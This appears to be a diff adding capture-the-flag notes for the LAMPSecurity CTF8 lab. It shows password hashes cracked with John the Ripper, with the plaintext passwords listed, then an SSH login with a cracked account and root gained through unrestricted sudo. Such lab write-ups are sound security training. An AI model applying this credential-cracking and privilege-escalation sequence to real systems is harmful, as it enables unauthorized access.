+Loaded 8 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+fantasy          (sloreman@localhost.localdomain)
+passw0rd         (bdio@localhost)
+football123      (spinkton@localhost)
+letmein!         (jharraway@localhost)
+1website         (sholden@localhost.localdomain)
+
+we have new users, maybe we can local privesc with one of them?
+
+sloreman doesn't work..
+already tried bdio
+jharraway doesn't offer much help
+sholden doesn't work either..
+
+root@kali:~/ctf_shit/lamp_8# ssh spinkton@ctf01.root-me.org
+
+Welcome to LAMPSecurity Research SSH access!
+#flag#5e937c51b852e1ee90d42ddb5ccb8997
+
+Unauthorized access is expected...
+spinkton@ctf01.root-me.org's password: 
+Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
+#flag#motd-flag
+[spinkton@localhost ~]$ id
+uid=501(spinkton) gid=505(spinkton) groups=10(wheel),500(it),505(spinkton) context=user_u:system_r:unconfined_t
+[spinkton@localhost ~]$ sudo -l
+Password: 
+User spinkton may run the following commands on this host:
+    (ALL) ALL
+
+WHOA OK THEN
+
+[spinkton@localhost ~]$ su - 
+Password: 
+su: incorrect password
+
+hmmm..
+
+[spinkton@localhost ~]$ sudo su
+[root@localhost spinkton]# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t
+
+
+done
+
